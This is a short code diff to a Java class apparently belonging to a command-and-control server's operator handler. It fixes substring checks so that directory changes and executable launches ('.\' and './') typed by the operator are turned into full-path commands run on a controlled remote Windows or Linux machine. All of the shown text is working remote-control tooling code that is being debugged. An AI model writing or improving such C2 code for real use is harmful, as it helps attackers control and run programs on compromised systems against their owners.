@@ -320,7 +320,7 @@ public class C2ServerUserHandler implements Runnable{
                     if(command.equals("q")){
                         currentUserPath = "";
                         break;
-                    } else if (command.substring(0,1).equals("cd")){
+                    } else if (command.substring(0,2).equals("cd")){
                         // Change Current Directory
                         currentDirectory = command.substring(3);
                         System.out.println("entered: " + command.substring(3));
@@ -332,11 +332,11 @@ public class C2ServerUserHandler implements Runnable{
                     } else if (command.equals("ls -la")){
                         // List items with extra details of current directory
                         command = "ls -la " + currentDirectory;
-                    } else if (command.substring(0,1).equals(".\\")){
+                    } else if (command.substring(0,2).equals(".\\")){
                         // if the first two characters are .\, then it is attempting to run an executable on windows, in the current directory.
                         // Because we are not actually in the current directory, we will use &, followed by the full executable path
                         command = "& " + currentDirectory + command.substring(2);
-                    } else if (command.substring(0,1).equals("./")){
+                    } else if (command.substring(0,2).equals("./")){
                         // If the first two characters are ./, then it is attempting to run an executable on linux in the current directory
                         // Because we are not actually in the current directory, we will just use the full executable name
                         command = currentDirectory + command.substring(2);
